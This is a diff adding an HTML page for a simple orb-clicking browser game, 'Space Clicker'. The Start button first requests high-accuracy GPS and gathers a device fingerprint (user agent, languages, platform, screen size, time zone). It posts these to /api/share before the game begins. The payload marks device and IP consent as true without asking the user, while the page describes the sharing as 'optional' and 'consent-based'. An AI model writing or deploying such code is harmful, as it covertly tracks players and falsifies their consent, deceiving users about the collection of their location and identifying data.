@@ -1,0 +1,217 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Space Clicker</title>
+  <style>
+    :root {
+      color-scheme: light dark;
+      --bg: #0b1020;
+      --panel: #141a2d;
+      --accent: #22d3ee;
+      --text: #e5f4ff;
+      --muted: #90a0b6;
+    }
+    html, body { height: 100%; }
+    body { margin: 0; background: var(--bg); color: var(--text); font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; display: flex; align-items: center; justify-content: center; }
+    .wrap { width: min(920px, 92vw); }
+    header { display: flex; align-items: center; justify-content: space-between; margin: 16px 0; }
+    h1 { margin: 0; font-size: 1.25rem; letter-spacing: 0.5px; }
+    .hud { display: flex; gap: 12px; align-items: center; color: var(--muted); }
+    .chip { background: #0d152b; border: 1px solid #1f2a44; padding: 6px 10px; border-radius: 999px; }
+    canvas { display: block; width: 100%; height: auto; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.35); background: radial-gradient(1000px 500px at 50% -200px, #1a2454, #0b1020 60%); }
+    .panel { background: var(--panel); border: 1px solid #1f2a44; border-radius: 12px; padding: 16px; margin-top: 16px; }
+    button { padding: 10px 14px; font-size: 16px; border: 0; border-radius: 8px; background: var(--accent); color: #021018; cursor: pointer; font-weight: 600; }
+    button:disabled { opacity: 0.6; cursor: not-allowed; }
+    label { display: block; margin: 8px 0; }
+    .center { text-align: center; }
+    .hidden { display: none; }
+    .mono { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; white-space: pre-wrap; color: var(--muted); }
+  </style>
+  <meta name="color-scheme" content="light dark" />
+  <meta name="description" content="Mini-game with optional consent-based sharing" />
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='0.9em' font-size='90'>🕹️</text></svg>">
+ </head>
+<body>
+  <div class="wrap">
+    <header>
+      <h1>Space Clicker</h1>
+      <div class="hud">
+        <div class="chip">Score: <span id="score">0</span></div>
+        <div class="chip">Time: <span id="time">15</span>s</div>
+      </div>
+    </header>
+
+    <canvas id="game" width="900" height="480"></canvas>
+
+    <div id="menu" class="panel center">
+      <p>Click the moving orb to score points. You have 15 seconds!</p>
+      <button id="startBtn">Start Game</button>
+      <div class="mono" id="preStatus"></div>
+    </div>
+
+    <div id="end" class="panel hidden">
+      <h3>Game Over</h3>
+      <span id="shareStatus" class="mono"></span>
+    </div>
+  </div>
+
+  <script>
+    // --- Game State ---
+    const canvas = document.getElementById('game');
+    const ctx = canvas.getContext('2d');
+    const scoreEl = document.getElementById('score');
+    const timeEl = document.getElementById('time');
+    const menu = document.getElementById('menu');
+    const endPanel = document.getElementById('end');
+    const startBtn = document.getElementById('startBtn');
+    const preStatus = document.getElementById('preStatus');
+    const shareStatus = document.getElementById('shareStatus');
+
+    let playing = false;
+    let score = 0;
+    let timeLeft = 15; // seconds
+    let orb = { x: 200, y: 200, r: 24, vx: 3, vy: 2 };
+    let loop = null;
+
+    function resetGame() {
+      score = 0;
+      timeLeft = 15;
+      orb = { x: 200, y: 200, r: 24, vx: 3 + Math.random()*2, vy: 2 + Math.random()*2 };
+      scoreEl.textContent = '0';
+      timeEl.textContent = '15';
+    }
+
+    function drawBackground() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      // stars
+      ctx.fillStyle = 'rgba(255,255,255,0.8)';
+      for (let i = 0; i < 80; i++) {
+        const sx = (i * 127) % canvas.width;
+        const sy = (i * 263) % canvas.height;
+        const r = (i % 3) * 0.5 + 0.4;
+        ctx.beginPath(); ctx.arc(sx, sy, r, 0, Math.PI*2); ctx.fill();
+      }
+    }
+
+    function drawOrb() {
+      const grad = ctx.createRadialGradient(orb.x - 6, orb.y - 6, 4, orb.x, orb.y, orb.r);
+      grad.addColorStop(0, '#c8fff4');
+      grad.addColorStop(1, '#12bcd6');
+      ctx.fillStyle = grad;
+      ctx.beginPath(); ctx.arc(orb.x, orb.y, orb.r, 0, Math.PI*2); ctx.fill();
+      ctx.strokeStyle = 'rgba(34,211,238,0.6)';
+      ctx.lineWidth = 3; ctx.stroke();
+    }
+
+    function update() {
+      orb.x += orb.vx; orb.y += orb.vy;
+      if (orb.x < orb.r || orb.x > canvas.width - orb.r) orb.vx *= -1;
+      if (orb.y < orb.r || orb.y > canvas.height - orb.r) orb.vy *= -1;
+    }
+
+    function render() {
+      drawBackground();
+      drawOrb();
+      ctx.fillStyle = 'rgba(255,255,255,0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+    }
+
+    function tick() {
+      if (!playing) return;
+      update();
+      render();
+      loop = requestAnimationFrame(tick);
+    }
+
+    function startGame() {
+      resetGame();
+      playing = true;
+      menu.classList.add('hidden');
+      endPanel.classList.add('hidden');
+      tick();
+      const interval = setInterval(() => {
+        if (!playing) return clearInterval(interval);
+        timeLeft -= 1; timeEl.textContent = String(timeLeft);
+        if (timeLeft <= 0) { endGame(); clearInterval(interval); }
+      }, 1000);
+    }
+
+    function endGame() {
+      playing = false;
+      cancelAnimationFrame(loop);
+      endPanel.classList.remove('hidden');
+      shareStatus.textContent = `Your score: ${score}`;
+    }
+
+    canvas.addEventListener('click', (e) => {
+      if (!playing) return;
+      const rect = canvas.getBoundingClientRect();
+      const mx = (e.clientX - rect.left) * (canvas.width / rect.width);
+      const my = (e.clientY - rect.top) * (canvas.height / rect.height);
+      const dx = mx - orb.x, dy = my - orb.y;
+      if (Math.hypot(dx, dy) <= orb.r + 2) {
+        score += 1; scoreEl.textContent = String(score);
+        // Speed up and jump
+        orb.vx *= 1.05; orb.vy *= 1.05;
+        orb.x = Math.random() * (canvas.width - 2*orb.r) + orb.r;
+        orb.y = Math.random() * (canvas.height - 2*orb.r) + orb.r;
+      }
+    });
+    // start after attempting to share
+    startBtn.addEventListener('click', startWithPrompt);
+
+    function getDeviceInfo() {
+      const hints = navigator.userAgentData;
+      return {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        languages: navigator.languages,
+        platform: navigator.platform,
+        screen: { width: screen.width, height: screen.height, dpr: window.devicePixelRatio },
+        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        ...(hints ? { brands: hints.brands, mobile: hints.mobile, platformHint: hints.platform } : {})
+      };
+    }
+
+    function getGPSPosition() {
+      return new Promise((resolve) => {
+        if (!('geolocation' in navigator)) return resolve(null);
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve({
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            accuracyMeters: pos.coords.accuracy
+          }),
+          err => resolve({ error: err.message }),
+          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        );
+      });
+    }
+    async function sendShare(payload) {
+      const resp = await fetch('/api/share', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+      return resp.json();
+    }
+
+    async function requestLocationAndShare() {
+      preStatus.textContent = 'Requesting location...';
+      const gps = await getGPSPosition();
+      const payload = { consent: { device: true, ip: true, gps: !!gps }, device: getDeviceInfo(), gps, score };
+      try {
+        const data = await sendShare(payload);
+        preStatus.textContent = data?.status === 'ok' ? 'Shared. Enjoy the game!' : 'Failed to share.';
+      } catch {
+        preStatus.textContent = 'Failed to share.';
+      }
+    }
+
+    async function startWithPrompt() {
+      await requestLocationAndShare(); // user gesture: Start button click
+      startGame();
+    }
+  </script>
+</body>
+</html>
+
+
